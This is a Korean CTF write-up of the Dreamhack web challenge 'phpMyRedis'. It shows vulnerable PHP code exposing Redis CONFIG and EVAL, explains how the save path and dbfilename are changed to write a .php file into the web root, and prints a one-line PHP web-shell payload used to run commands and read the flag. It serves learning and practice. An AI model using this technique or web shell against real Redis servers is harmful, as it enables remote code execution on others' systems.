---
title: phpMyRedis
tags:
  - Dreamhack
  - web
  - writeup
---
# 1. 문제
![[assets/Pasted image 20260713143306.png]]
- php로 redis를 관리하는 서비스에서 취약점을 찾고 flag를 획득하는 문제이다.
# 2. 문제 분석
- config.php 페이지에서 접근해 입력하게 되면 php에서 Redis config 확장 메서드를 사용해 요청 보낸다.
	- config.php 파일 코드
```php
	  <?php
         if(isset($_POST['option'])){
           $redis = new Redis();
           $redis->connect($REDIS_HOST);
           if($_POST['option'] == 'GET'){
             $ret = json_encode($redis->config($_POST['option'], $_POST['key']));
           }elseif($_POST['option'] == 'SET'){
             $ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
           }else{
              die('error !');
           }                    
           echo '<h1 class="subtitle">Result</h1>';
           echo "<pre>$ret</pre>";
           }
     ?>	  
```
- index.php 페이지에서는 Redis eval 확장 메서드를 사용해 입력 받은 cmd를 lua 스크립트로 보낸다.
```php
if(isset($_POST['cmd'])){
    $redis = new Redis();
    $redis->connect($REDIS_HOST);
    $ret = json_encode($redis->eval($_POST['cmd']));
```
# 3. 문제 풀이
1. config 페이지에서 GET 요청으로 dir을 보내 현재 저장 경로를 조회한다.
	![[Pasted image 20260713154414.png]]
	- 현재 저장 경로 `/var/www/html`
2. SET 요청을 통해 저장 위치를 변경한다.
	- 파일명을 `php`확장자로 설정해 저장하면 해당 파일에 저장된 내용이 실행 가능하기 때문에 php 확장자를 붙여 RDB를 설정한다.
	![[Pasted image 20260713164855.png]]
3. RDB를 설정해도 이는 스냅샷 형태로 실제 저장된게 아니기 때문에 `save '초' '변경 키 수'` 조건에 맞춰 `save 1 1`을 넣어 저장한다.
	![[Pasted image 20260713162212.png]]
4. command 페이지는 eval 메서드를 사용하기 때문에 lua 스크립트에서 Redis DB와 상호 작용하기 위해 호출하는 함수 redis.call을 사용해 php 쉘 문자열을 입력해 저장한다.
	`return redis.call("set", "tmp", "<?php system($_GET['cmd']); ?>");`
	![[Pasted image 20260713202100.png]]
5. url을 사용해 설정한 shell.php 안에 있는 cmd에 명령을 삽입해 flag를 확인할 수 있다.![[Pasted image 20260713203353.png]]
# 4. 느낌
- 기존에는 문제를 풀 때 AI를 자주 사용하며 웹 해킹 기법을 단순히 눈으로 익히고 외우는 식으로 접근했다. 하지만 시간이 오래 걸려도 AI와 Write-up 없이 스스로 부딪혀보는 것이 실력 향상에 훨씬 좋다는 조언을 듣고, 이번 문제는 어떠한 도움도 없이 직접 풀어보았다.
- 일주일 이상 걸린 삽질이었지만, LLM을 구글 검색하듯 활용하면서 PHP에서 Redis를 다루는 방법 등을 깊이 공부하고 많은 지식을 얻었다. 아직 완벽하지는 않아도, AI를 더 효율적으로 활용하는 방법과 나에게 맞는 공부법이 무엇인지 조금은 감을 잡은 것 같다.